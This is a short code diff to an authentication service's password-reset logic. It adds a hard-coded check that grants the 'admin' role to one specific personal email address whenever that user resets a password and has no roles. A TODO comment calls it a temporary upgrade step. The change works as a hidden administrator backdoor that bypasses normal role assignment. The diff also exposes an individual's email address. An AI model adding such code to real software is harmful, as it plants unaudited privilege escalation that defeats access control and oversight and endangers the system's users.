@@ -142,6 +142,9 @@ class AuthService[T: AuthUser]:
                 user.hashed_password = None
                 user.reset_code = None
                 user.reset_code_exp = None
+                if user.email == "marcin.leliwa@gmail.com" and not user.roles:
+                    # TODO: Remove this after upgrade to new version
+                    user.roles = ["admin"]
                 self._user_service.update(user.username, user)
             else:
                 raise ResetCodeExpiredException
